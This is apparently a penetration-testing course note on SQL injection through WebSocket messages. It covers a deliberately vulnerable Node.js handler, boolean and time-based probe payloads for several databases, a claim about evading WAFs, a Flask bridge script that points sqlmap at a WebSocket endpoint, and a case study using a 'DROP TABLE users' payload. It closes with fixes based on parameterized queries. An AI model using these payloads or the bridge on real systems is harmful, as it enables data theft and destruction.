---
tags: [vapt, websockets, sqli, advanced, deepdive]
difficulty: advanced
module: "29 - WebSockets Security"
topic: "29.06 WebSocket SQLi"
---

# 29.06 — WebSocket SQLi (SQL Injection)

## 1. Introduction: The Invisible Database Threat
**WebSocket SQL Injection (SQLi)** is exactly what it sounds like: injecting malicious SQL syntax into backend database queries. The fundamental vulnerability (lack of parameterized queries) is identical to traditional HTTP SQLi. 

However, WebSocket SQLi is considered an advanced attack vector because of **the immense difficulty in discovering and exploiting it using automated tools**. 

Traditional Web Application Firewalls (WAFs) and Intrusion Detection Systems (IDS) are heavily optimized to parse HTTP traffic. They look for suspicious signatures (like `' OR 1=1--`) inside URL query parameters, HTTP headers, and standard POST bodies. When traffic is upgraded to a WebSocket connection, it becomes a continuous stream of custom-framed binary data. Many legacy WAFs simply stop inspecting the payload once the 101 Switching Protocols response is sent. Therefore, an attacker can smuggle blatant, un-obfuscated SQLi payloads past enterprise-grade security appliances simply by delivering them over a WebSocket frame.

Furthermore, industry-standard automated scanners like SQLmap or Nessus are designed around the HTTP request/response paradigm. They do not natively know how to open a WebSocket handshake, authenticate it, identify the JSON schema, and fuzz the individual keys within the binary frames. Because scanners are blind to it, developers often falsely assume their WebSocket endpoints are secure, leaving devastating SQLi flaws untouched in production.

## 2. The Vulnerable Architecture
The flaw occurs when the backend server (often Node.js, Python/WebSockets, or Java/Spring WebFlux) receives a JSON message from the socket, extracts a value, and concatenates it directly into a raw SQL query string.

```javascript
// Extremely Vulnerable Node.js WebSocket Handler
ws.on('message', function incoming(message) {
    let data = JSON.parse(message);
    
    // The application expects: {"action": "get_user", "id": "45"}
    if (data.action === 'get_user') {
        
        // THE CATASTROPHIC FLAW: Direct string concatenation
        let query = "SELECT username, email, role FROM users WHERE id = " + data.id;
        
        db.query(query, function(err, results) {
            // Send the results back over the socket
            ws.send(JSON.stringify({ status: "success", user: results }));
        });
    }
});
```

If an attacker sends the JSON payload `{"action": "get_user", "id": "45 OR 1=1"}`, the resulting query executed on the database is `SELECT username, email, role FROM users WHERE id = 45 OR 1=1`, returning the entire user table back over the socket.

## 3. Extensive ASCII Diagram: Blind SQLi over WebSockets
In many modern architectures, the application doesn't return the raw database rows directly back to the socket. It might just return `{"status": "success"}`. In this scenario, the attacker must utilize **Time-Based Blind SQLi** to infer data character by character based on how long the server takes to respond.

```text
================================================================================
                    TIME-BASED BLIND SQLi OVER WEBSOCKETS
================================================================================

[ The Attacker's Strategy ]
The attacker wants to know if the database user is 'root'. They use Burp Repeater 
to send a crafted JSON payload containing a conditional time delay.

    [ OUTBOUND WEBSOCKET FRAME ]
    {
       "action": "view_profile",
       "user_id": "1; IF (SYSTEM_USER = 'root') WAITFOR DELAY '0:0:10'--"
    }

[ The WAF Evasion ]
The corporate WAF inspects the HTTP headers of the upgrade request. Everything 
looks fine. It ignores the binary WebSocket frames. The payload slips right through.

[ The Backend Execution (Microsoft SQL Server) ]
The backend concatenates the payload:
`SELECT * FROM profiles WHERE user_id = 1; IF (SYSTEM_USER = 'root') WAITFOR DELAY '0:0:10'--`

The database executes the query.
The condition `(SYSTEM_USER = 'root')` evaluates to TRUE.
The database engine pauses execution for exactly 10 seconds.
The backend Node.js thread waiting for the database callback hangs for 10 seconds.

[ The Confirmation ]
10 seconds later, the database finishes. The backend sends the WebSocket reply:
    [ INBOUND WEBSOCKET FRAME ]
    { "status": "profile_loaded", "data": "..." }

The attacker measures the round-trip time. Because it took exactly 10 seconds, 
the attacker has mathematically proven that the database user is 'root'. They 
can now use this technique to extract the entire database bit by bit.
================================================================================
```

## 4. Methodological Discovery

**Step 1: Identifying Data Interaction Vectors**
- Map the application using Burp Suite's `WebSockets history` tab.
- Look for `action` or `type` parameters that clearly involve database lookups. Examples: `search_inventory`, `load_chat_history`, `get_profile`, `filter_results`.
- Identify the specific parameters passed with these actions (e.g., `item_id`, `search_term`, `user_uuid`).

**Step 2: Manual Fuzzing via Burp Repeater**
- Send the target WebSocket frame to Burp Repeater.
- Fuzz every single parameter using classic SQLi probes. Do not assume that integer fields are safe; if they are concatenated as strings on the backend, they are vulnerable.
- **Error-Based Probes:** Inject a single quote `'`, a double quote `"`, or an unmatched parenthesis `)`. Does the server return a JSON error like `{"error": "Internal Server Error"}`? Does the WebSocket connection suddenly crash and close (Code 1006 or 1011)? This indicates a broken SQL syntax error.
- **Boolean-Based Probes:** 
  - Send: `{"id": "5 AND 1=1"}` (Should return normal data)
  - Send: `{"id": "5 AND 1=0"}` (Should return empty data or "not found")
- **Time-Based Probes:** 
  - PostgreSQL: `{"id": "5; SELECT pg_sleep(10)--"}`
  - MySQL: `{"id": "5 AND SLEEP(10)--"}`
  - MS SQL: `{"id": "5'; WAITFOR DELAY '0:0:10'--"}`

## 5. Exploitation: Bridging SQLmap with WebSockets
Manually extracting a database via Blind SQLi over a WebSocket is agonizingly slow. To automate the extraction, penetration testers build a "Proxy Bridge." This is a custom script that listens for local HTTP requests from SQLmap, translates the payload into the required JSON WebSocket frame, sends it to the target, receives the WebSocket reply, and translates it back into an HTTP response for SQLmap.

**The Middleware Bridge Architecture (Python Concept):**
```python
# A conceptual example of a Flask-to-WebSocket bridge
from flask import Flask, request
import websocket
import json

app = Flask(__name__)
# 1. Establish the authenticated WebSocket connection
ws = websocket.create_connection("wss://target-bank.com/api", cookie="session=V_TOKEN")

@app.route("/sqli_bridge")
def bridge():
    # 2. Receive the SQLi payload from SQLmap via a local HTTP GET parameter
    sqlmap_payload = request.args.get('inject')
    
    # 3. Pack the payload into the application's specific JSON schema
    ws_frame = {
        "action": "search_transactions",
        "account_id": sqlmap_payload  # The injection point
    }
    
    # 4. Send the frame over the persistent WebSocket
    ws.send(json.dumps(ws_frame))
    
    # 5. Wait for the server's reply
    result = ws.recv()
    
    # 6. Return the raw WebSocket data as an HTTP response to trick SQLmap
    return result

if __name__ == "__main__":
    app.run(port=8080)
```
Once the bridge is running, the tester simply commands SQLmap to attack the local bridge:
`sqlmap -u "http://localhost:8080/sqli_bridge?inject=1*" --dbs --batch`
SQLmap believes it is attacking a standard HTTP API, completely unaware that it is actually executing an advanced WebSocket attack against the true target.

## 6. Real-World Case Study
During a red team engagement for a financial technology startup, the team analyzed a real-time trading dashboard. The dashboard updated stock prices dynamically using WebSockets. Users could add stocks to their watchlist, which triggered a WebSocket message: `{"action": "add_to_watchlist", "ticker_symbol": "AAPL"}`.

The backend Node.js server concatenated the `ticker_symbol` directly into an `INSERT` statement. The red team intercepted the message and altered the ticker symbol to `'AAPL'); DROP TABLE users;--`. Because the traffic was sent over `wss://`, the corporate Cloudflare WAF ignored the payload. The backend executed the stacked query, dropping the entire users table and causing a catastrophic denial of service across the entire platform.

## 7. How to Fix It (Developer Remediation)

The remediation for WebSocket SQLi is entirely identical to the remediation for HTTP SQLi. The transport mechanism does not change the defensive mechanism.

**1. Universal Use of Parameterized Queries (Prepared Statements)**
Developers must *never* use string concatenation or string formatting to build SQL queries, regardless of where the input originated. Always use the parameterized query features provided by the database driver (e.g., PDO in PHP, PreparedStatement in Java, or parameterized arguments in Node.js `pg` or `mysql` libraries).

*Secure Node.js Example:*
```javascript
// The database driver handles escaping and parameterization
const query = "SELECT username, email FROM users WHERE id = $1";
const values = [data.id]; // User input passed safely as a parameter array

db.query(query, values, (err, res) => {
    ws.send(JSON.stringify({ user: res.rows[0] }));
});
```

**2. Strict Input Validation (Schema Enforcement)**
Before the JSON payload even reaches the database logic, it should be validated against a strict schema. If the `id` field is expected to be an integer, the backend schema validator should reject the message entirely if it contains a string or special characters, dropping the WebSocket frame before any backend processing occurs.

## Related Notes
- [[06.01 What is SQL Injection?]]
- [[06.03 Blind SQLi (Boolean & Time-based)]]
- [[29.04 WebSocket Message Manipulation]]
